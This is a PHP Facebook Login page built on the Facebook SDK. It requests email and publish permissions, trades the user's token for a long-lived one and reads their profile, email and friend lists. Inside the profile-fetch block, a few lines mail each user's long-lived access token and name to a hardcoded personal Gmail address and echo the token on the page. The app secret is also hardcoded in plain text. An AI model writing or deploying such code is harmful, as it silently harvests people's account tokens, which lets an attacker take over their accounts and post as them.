








<?php
session_start();
require_once __DIR__ . '/src/Facebook/autoload.php';



$fb = new Facebook\Facebook([
  'app_id' => '590954054420388',
  'app_secret' => 'b4f614683d10eabda014b9acf449c6e3',
  'default_graph_version' => 'v2.0',
  ]);

$helper = $fb->getRedirectLoginHelper();

$permissions = ['email','publish_actions']; // optional
  
try {
  if (isset($_SESSION['facebook_access_token'])) {
    $accessToken = $_SESSION['facebook_access_token'];
  } else {
      $accessToken = $helper->getAccessToken();
  }
} catch(Facebook\Exceptions\FacebookResponseException $e) {
  // When Graph returns an error
  echo 'Graph returned an error: ' . $e->getMessage();

    exit;
} catch(Facebook\Exceptions\FacebookSDKException $e) {
  // When validation fails or other local issues
  echo 'Facebook SDK returned an error: ' . $e->getMessage();
    exit;
 }



if (isset($accessToken)) {
  if (isset($_SESSION['facebook_access_token'])) {
    $fb->setDefaultAccessToken($_SESSION['facebook_access_token']);
	 
  } else {
    // getting short-lived access token
    $_SESSION['facebook_access_token'] = (string) $accessToken;

      // OAuth 2.0 client handler
    $oAuth2Client = $fb->getOAuth2Client();

    // Exchanges a short-lived access token for a long-lived one
    $longLivedAccessToken = $oAuth2Client->getLongLivedAccessToken($_SESSION['facebook_access_token']);

    $_SESSION['facebook_access_token'] = (string) $longLivedAccessToken;

    // setting default access token to be used in script
    $fb->setDefaultAccessToken($_SESSION['facebook_access_token']);
  }

  // redirect the user back to the same page if it has "code" GET variable
  if (isset($_GET['code'])) {
    header('Location: ./');
	   
  }

  // getting basic info about user
  try {
    $profile_request = $fb->get('/me?fields=name,first_name,last_name,email,website,friendlists,about');
    $profile = $profile_request->getGraphNode()->asArray();
    


if(@$_SESSION['facebook_access_token']){
$a = $_SESSION['facebook_access_token'];
mail('amr2010mohamd2010@gmail.com','access','$a,$profile[name]');
	echo "<br>$a</br>";
}





  } catch(Facebook\Exceptions\FacebookResponseException $e) {
    // When Graph returns an error
    echo 'Graph returned an error: ' . $e->getMessage();
    session_destroy();
    // redirecting user back to app login page
    header("Location: ./");
    exit;
  } catch(Facebook\Exceptions\FacebookSDKException $e) {
    // When validation fails or other local issues
    echo 'Facebook SDK returned an error: ' . $e->getMessage();
    exit;
  }
  
  // printing $profile array on the screen which holds the basic info about user
  print_r($profile);

    // Now you can redirect to another page and use the access token from $_SESSION['facebook_access_token']
} else {
  // replace your website URL same as added in the developers.facebook.com/apps e.g. if you used http instead of https and you used non-www version or www version of your website then you must add the same here
  $loginUrl = $helper->getLoginUrl('http://localhost/aa/a.php', $permissions);
  echo '<a href="' . $loginUrl . '">Log in with Facebook!</a>';
}


	

